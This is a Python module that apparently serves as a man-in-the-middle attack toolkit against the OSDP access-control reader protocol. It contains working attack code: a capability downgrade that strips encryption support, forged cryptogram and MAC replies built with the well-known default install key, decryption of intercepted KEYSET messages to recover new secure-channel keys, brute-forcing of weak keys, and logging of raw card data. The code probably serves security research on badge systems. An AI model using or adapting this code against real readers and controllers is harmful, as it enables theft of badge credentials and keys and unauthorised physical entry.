from termcolor import colored
from Crypto.Cipher import AES
import json

crc_table = [
    0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50A5, 0x60C6, 0x70E7, 0x8108, 0x9129, 0xA14A, 0xB16B, 0xC18C,
    0xD1AD, 0xE1CE, 0xF1EF, 0x1231, 0x0210, 0x3273, 0x2252, 0x52B5, 0x4294, 0x72F7, 0x62D6, 0x9339, 0x8318,
    0xB37B, 0xA35A, 0xD3BD, 0xC39C, 0xF3FF, 0xE3DE, 0x2462, 0x3443, 0x0420, 0x1401, 0x64E6, 0x74C7, 0x44A4,
    0x5485, 0xA56A, 0xB54B, 0x8528, 0x9509, 0xE5EE, 0xF5CF, 0xC5AC, 0xD58D, 0x3653, 0x2672, 0x1611, 0x0630,
    0x76D7, 0x66F6, 0x5695, 0x46B4, 0xB75B, 0xA77A, 0x9719, 0x8738, 0xF7DF, 0xE7FE, 0xD79D, 0xC7BC, 0x48C4,
    0x58E5, 0x6886, 0x78A7, 0x0840, 0x1861, 0x2802, 0x3823, 0xC9CC, 0xD9ED, 0xE98E, 0xF9AF, 0x8948, 0x9969,
    0xA90A, 0xB92B, 0x5AF5, 0x4AD4, 0x7AB7, 0x6A96, 0x1A71, 0x0A50, 0x3A33, 0x2A12, 0xDBFD, 0xCBDC, 0xFBBF,
    0xEB9E, 0x9B79, 0x8B58, 0xBB3B, 0xAB1A, 0x6CA6, 0x7C87, 0x4CE4, 0x5CC5, 0x2C22, 0x3C03, 0x0C60, 0x1C41,
    0xEDAE, 0xFD8F, 0xCDEC, 0xDDCD, 0xAD2A, 0xBD0B, 0x8D68, 0x9D49, 0x7E97, 0x6EB6, 0x5ED5, 0x4EF4, 0x3E13,
    0x2E32, 0x1E51, 0x0E70, 0xFF9F, 0xEFBE, 0xDFDD, 0xCFFC, 0xBF1B, 0xAF3A, 0x9F59, 0x8F78, 0x9188, 0x81A9,
    0xB1CA, 0xA1EB, 0xD10C, 0xC12D, 0xF14E, 0xE16F, 0x1080, 0x00A1, 0x30C2, 0x20E3, 0x5004, 0x4025, 0x7046,
    0x6067, 0x83B9, 0x9398, 0xA3FB, 0xB3DA, 0xC33D, 0xD31C, 0xE37F, 0xF35E, 0x02B1, 0x1290, 0x22F3, 0x32D2,
    0x4235, 0x5214, 0x6277, 0x7256, 0xB5EA, 0xA5CB, 0x95A8, 0x8589, 0xF56E, 0xE54F, 0xD52C, 0xC50D, 0x34E2,
    0x24C3, 0x14A0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405, 0xA7DB, 0xB7FA, 0x8799, 0x97B8, 0xE75F, 0xF77E,
    0xC71D, 0xD73C, 0x26D3, 0x36F2, 0x0691, 0x16B0, 0x6657, 0x7676, 0x4615, 0x5634, 0xD94C, 0xC96D, 0xF90E,
    0xE92F, 0x99C8, 0x89E9, 0xB98A, 0xA9AB, 0x5844, 0x4865, 0x7806, 0x6827, 0x18C0, 0x08E1, 0x3882, 0x28A3,
    0xCB7D, 0xDB5C, 0xEB3F, 0xFB1E, 0x8BF9, 0x9BD8, 0xABBB, 0xBB9A, 0x4A75, 0x5A54, 0x6A37, 0x7A16, 0x0AF1,
    0x1AD0, 0x2AB3, 0x3A92, 0xFD2E, 0xED0F, 0xDD6C, 0xCD4D, 0xBDAA, 0xAD8B, 0x9DE8, 0x8DC9, 0x7C26, 0x6C07,
    0x5C64, 0x4C45, 0x3CA2, 0x2C83, 0x1CE0, 0x0CC1, 0xEF1F, 0xFF3E, 0xCF5D, 0xDF7C, 0xAF9B, 0xBFBA, 0x8FD9,
    0x9FF8, 0x6E17, 0x7E36, 0x4E55, 0x5E74, 0x2E93, 0x3EB2, 0x0ED1, 0x1EF0
]

SCBKD = bytes([
            0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
            0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F
    	])

def generate_key(first: bytes, second: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(first + second)
    
def derive_session_key(server_random_number: bytes, scbk: bytes, keytype: str):
    _enc = None
    if keytype == "s_enc":
        _enc = generate_key(
            bytes([
                0x01, 0x82,
                server_random_number[0], server_random_number[1], server_random_number[2],
                server_random_number[3], server_random_number[4], server_random_number[5]
            ]),
            bytes([0x00] * 8),
            scbk
        )
    if keytype == "s_mac1":
        _enc = generate_key(
            bytes([
                0x01, 0x01,
                server_random_number[0], server_random_number[1], server_random_number[2],
                server_random_number[3], server_random_number[4], server_random_number[5]
            ]),
            bytes([0x00] * 8),
            scbk
        )
    if keytype == "s_mac2":
        _enc = generate_key(
            bytes([
                0x01, 0x02,
                server_random_number[0], server_random_number[1], server_random_number[2],
                server_random_number[3], server_random_number[4], server_random_number[5]
            ]),
            bytes([0x00] * 8),
            scbk
        )                
    return _enc

def calculate_cryptogram(rngA: bytes, rngB: bytes, session_key: bytes) -> bytes:
    cipher = AES.new(session_key, AES.MODE_ECB)
    return cipher.encrypt(rngA + rngB)

class OSDPHeader:
    def __init__(self):
        self.address = -1
        self.using_crc = False # False means using checksum
        self.packet_length = -1
        self.sequence_number = -1 # Only possible values are 0-2 btw...
        self.scb_present = False
        self.payload = b''
        
    def readFromSerial(self, dev):
        """Read and parse the header"""
        got_SOM = False
        # Keep reading bytes until we get a SOM byte. Some OSDP implementations send some amount of junk data before the SOM. 
        while not got_SOM:
            header = dev.read(1)
            got_SOM = header == b"S"
        self.payload = dev.read(4)
        self.address = self.payload[0]
        packet_length_lsb = self.payload[1]
        packet_length_msb = self.payload[2]
        self.packet_length = packet_length_lsb + (packet_length_msb * 0x100)
        message_control = self.payload[3]
        self.using_crc = (message_control & 0x04) == 0x04
        self.sequence_number = (message_control & 0x03)
        self.scb_present = (message_control & 0x08) == 0x08

class OSDPPacket:
    def __init__(self, header):
        self.header = header
        self.command = -1
        self.payload = b''
        self.crc = b''
        self.secure_block_type = -1
        self.secure_payload = b''
        self.is_scbkd = False
        self.secure_block_size = 0
        self.rng = None
        self.client_id = b''
        self.cryptogram = b''
        self.ciphertext = b''

    def getPayload(self):
        return b'S' + self.header.payload + self.payload

    def readFromSerial(self, dev):
        # Length minus 5 bytes already read, the length includes the whole packet
        self.payload = dev.read(self.header.packet_length-5)
        # Read security control block
        # TODO Actually parse encrypted packet
        if self.header.scb_present:
            self.secure_block_size = self.payload[0]
            self.secure_block_type = self.payload[1]
            self.secure_payload = self.payload[:self.secure_block_size]
            if self.secure_block_size >= 3:
                self.is_scbkd = (self.secure_payload[2]) == 0

            self.ciphertext = self.payload[self.secure_block_size:]
            if self.header.using_crc:
                self.ciphertext = self.ciphertext[:-2]
            else:
                self.ciphertext = self.ciphertext[:-1]

        self.command = self.payload[self.secure_block_size]

        # Command-specific logic
        prolog_len = self.secure_block_size+1
        if self.secure_block_type == 0x11:
            self.rng = self.payload[prolog_len:prolog_len+8]
        elif self.secure_block_type == 0x12:
            self.client_id = self.payload[prolog_len:prolog_len+8]
            self.rng = self.payload[prolog_len+8:prolog_len+16]
            self.cryptogram = self.payload[prolog_len+16:prolog_len+32]
        elif self.secure_block_type == 0x13:
            self.cryptogram = self.payload[prolog_len:prolog_len+16]

    def printCommandDebug(self):
        if self.command == 0x60:
            pass
            # print("Poll Request")
            # print("\tTo Address:", self.header.address)

        full_packet = b'S' + self.header.payload + self.payload

        if self.header.scb_present:
            print("\n")
            if self.secure_block_type == 0x15:
                print(colored("\"Secure Channel\" Request, but no data security", "magenta"))
                print("\tcommand:", hex(self.command))
            if self.secure_block_type == 0x16:
                print(colored("\"Secure Channel\" Reply, but no data security", "magenta"))
                print("\tcommand:", hex(self.command))
            if self.secure_block_type == 0x17:
                print("Encrypted request, with data security")
                print("\tcommand:", hex(self.command))
                return
            if self.secure_block_type == 0x18:
                print("Encrypted reply, with data security")
                print("\tcommand:", hex(self.command))
                return
        # Commands
        if self.command >= 0x60:
            if self.command == 0x61:
                print("ID Report Request")
            if self.command == 0x62:
                print("Capability Request")
            if self.command == 0x69:
                print("LED Control Request")
            if self.command == 0x6A:
                print("Reader Buzzer Request")
            if self.command == 0x75:
                print(colored("!!KEYSET Request!!", "green"))
                print("\tFull packet:", full_packet)
            # Request and Reply both use 0x76. Annoying.
            if self.command == 0x76:
                if self.secure_block_type == 0x11:
                    print("OSDP Challenge Request")
                    print("\tSCS type", hex(self.secure_block_type))
                    print("\tcontroller_rng", self.rng)
                elif self.secure_block_type == 0x12:
                    print("OSDP Challenge Reply")
                    print("\tSCS type", hex(self.secure_block_type))
                    print("\tclient_id", self.client_id)
                    print("\treader rng", self.rng)
                    print("\tcryptogram", self.cryptogram)
            if self.command == 0x77:
                print("OSDP Server Cryptogram Request")
                print("\tSCS type", hex(self.secure_block_type))
            if self.command != 0x60:
                print("\tTo Address:", self.header.address)
                print("\tlength:", self.header.packet_length)
                print("\tRequest command:", hex(self.command))

        # Replies
        else:
            if self.command == 0x48:
                print("Local Status Report Reply")
            if self.command == 0x50:
                print(colored("Card Data Raw Reply", "green"))
                print(colored("\tCard Data Raw: " + str(self.payload[self.secure_block_size+5:-2]), "green"))
            if self.command == 0x78:
                print("OSDP Client Cryptogram Reply")
                print("\tSCS type", hex(self.secure_block_type))
            if self.command == 0x40:
                pass
                # print("Ack Reply")
                # print("\treply_address", hex(reply_address))
            if self.command == 0x46:
                print("Capabilities Reply")
            if self.command == 0x45:
                print("PD ID Reply")
            if self.command == 0x41:
                print("NAK Reply")                
            if self.command != 0x40:
                print("\treply command:", hex(self.payload[0]))
                print("\treply_address", hex(self.header.address))
                print("\treply length:", self.header.packet_length)
                print("\twriting reply back to cp:")

    def recalculateChecksum(self):
        if self.header.using_crc:
            crc = 0x1D0F
            for t in self.getPayload()[:-2]:
                crc = ((crc << 8) ^ crc_table[((crc >> 8) ^ t) & 0xFF]) & 0xFFFF
            self.crc = crc.to_bytes(2, byteorder='little')
            self.payload = self.payload[:-2] + self.crc
        else:
            checksum = (0x100 - sum(self.getPayload()[:-1]) & 0xFF).to_bytes(1, byteorder='little')
            self.payload = self.payload[:-1] + bytes(checksum)

    def downgrade(self):
        # Modify capability to advertise no crytpo capability (0x0000 means no encryption support)
        # Loop through each 3-byte capability until we hit the crypto one (0x09)
        i = 1
        while i+3 < self.header.packet_length-5:
            if(self.payload[i] == 0x09):
                self.payload = self.payload[0:i] + b'\x09\x00\x00' + self.payload[i+3:]
            i += 3
        self.recalculateChecksum()

    # Set the packet's cryptogram field and recalculate checksums
    def setCryptogram(self, cryptogram: bytes):
        prolog_len = self.secure_block_size+1
        self.payload = self.payload[:prolog_len+16] + cryptogram + self.payload[prolog_len+32:]
        self.cryptogram = cryptogram
        self.recalculateChecksum()

    def decryptKeySet(self, key: bytes, mac_I: bytes) -> bytes:
        prolog_len = self.secure_block_size+1
        iv = bytes([(~b) & 0xFF for b in mac_I])

        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = self.payload[prolog_len:-6]
        plaintext = cipher.decrypt(ciphertext)
        decrypted_data = bytearray(plaintext)
        padding_start = 0x80
        while len(decrypted_data) > 0 and decrypted_data[-1] != padding_start:
            decrypted_data.pop()
        if len(decrypted_data) > 0 and decrypted_data[-1] == padding_start:
            decrypted_data.pop()
        return bytes(decrypted_data)[2:]

class KeyMaterial:
    def __init__(self):
        self.controller_rng = b''
        self.client_rng = b''
        self.client_id = b''
        self.client_cryptogram = b''
        self.controller_cryptogram = b''
        self.session_key = b''
        self.mac_I = b''

    def saveToFile(self, filepath: str = "keymaterial.json"):
        properties = {
            "controller_rng": self.controller_rng,
            "client_rng": self.client_rng,
            "client_id": self.client_id,
            "client_cryptogram": self.client_cryptogram,
            "controller_cryptogram": self.controller_cryptogram,
            "session_key": self.session_key,
        }
        with open(filepath, "w") as outfile:
            json.dump(properties, outfile)

    def loadFromFile(self, filepath: str = "keymaterial.json"):
        f = open (filepath, "r")
        data = json.loads(f.read())
        self.controller_rng = data["controller_rng"]
        self.client_rng = data["client_rng"]
        self.client_id = data["client_id"]
        self.client_cryptogram = data["client_cryptogram"]
        self.controller_cryptogram = data["controller_cryptogram"]
        self.session_key = data["session_key"]

def forgeCryptogramResponse(sequence_number: int, client_id: bytes, rng: bytes, cryptogram: bytes) -> bytes:
    # SOM, Addr, Len
    payload = b"S\x84+\x00"
    # MSG control
    msg_control = sequence_number + 4 + 8
    payload += msg_control.to_bytes(1, 'big')
    # Sec len, sec type, sec data
    payload += b"\x03\x12\x01"
    # Command
    payload += b"v"
    # Client ID, RNG, cryptogram
    payload += client_id
    payload += rng
    payload += cryptogram
    # CRC
    crc = 0x1D0F
    for t in payload:
        crc = ((crc << 8) ^ crc_table[((crc >> 8) ^ t) & 0xFF]) & 0xFFFF
    payload += crc.to_bytes(2, byteorder='little')
    return payload

def forgeMACResponse(sequence_number: int, keymaterial: KeyMaterial) -> bytes:
    # SOM, Addr, Len
    payload = b"S\x84"
    # len
    payload += b"\x1B\x00"
    # MSG control
    msg_control = sequence_number + 4 + 8
    payload += msg_control.to_bytes(1, 'big')
    # Sec len, sec type, sec data
    payload += b"\x03\x14\x01"
    # Command
    payload += b"\x78"
    # Compute MAC_I
    s_mac1 = derive_session_key(keymaterial.controller_rng, SCBKD, "s_mac1")
    s_mac2 = derive_session_key(keymaterial.controller_rng, SCBKD, "s_mac2")
    cipher = AES.new(s_mac1, AES.MODE_ECB)
    ciphertext = cipher.encrypt(keymaterial.controller_cryptogram)
    cipher = AES.new(s_mac2, AES.MODE_ECB)
    mac_I = cipher.encrypt(ciphertext)
    payload += mac_I
    keymaterial.mac_I = mac_I
    # CRC
    crc = 0x1D0F
    for t in payload:
        crc = ((crc << 8) ^ crc_table[((crc >> 8) ^ t) & 0xFF]) & 0xFFFF
    payload += crc.to_bytes(2, byteorder='little')
    return payload

def enumerateWeakKeys(controller_rng: bytes, client_rng: bytes, cryptogram: bytes) -> bytes:
    # Try all same-byte keys (all-0's, all 1's, etc...)
    for i in range(0x100):
        key = bytes([i,i,i,i,i,i,i,i,i,i,i,i,i,i,i,i])
        if _testKey(controller_rng, client_rng, cryptogram, key) == True:
            return key
    # Try all monotonically incrementing keys (1,2,3,4,5...)
    for i in range(0x100):
        key = bytes([i,(i+1)%0x100,(i+2)%0x100,(i+3)%0x100,(i+4)%0x100,(i+5)%0x100,(i+6)%0x100,(i+7)%0x100,
                    (i+8)%0x100,(i+9)%0x100,(i+10)%0x100,(i+11)%0x100,(i+12)%0x100,(i+13)%0x100,(i+14)%0x100,(i+15)%0x100])
        if _testKey(controller_rng, client_rng, cryptogram, key) == True:
            return key
    # Try all monotonically decreasing keys (20, 19, 18...)
    for i in range(0x100):
        key = bytes([i,(i-1)%0x100,(i-2)%0x100,(i-3)%0x100,(i-4)%0x100,(i-5)%0x100,(i-6)%0x100,(i-7)%0x100,
                    (i-8)%0x100,(i-9)%0x100,(i-10)%0x100,(i-11)%0x100,(i-12)%0x100,(i-13)%0x100,(i-14)%0x100,(i-15)%0x100])
        if _testKey(controller_rng, client_rng, cryptogram, key) == True:
            return key

    return b''

def _testKey(controller_rng: bytes, client_rng: bytes, cryptogram: bytes, key: bytes) -> bool:
    session_key = derive_session_key(controller_rng, key, "s_enc")
    computed_cryptogram = calculate_cryptogram(controller_rng, client_rng, session_key)
    return computed_cryptogram == cryptogram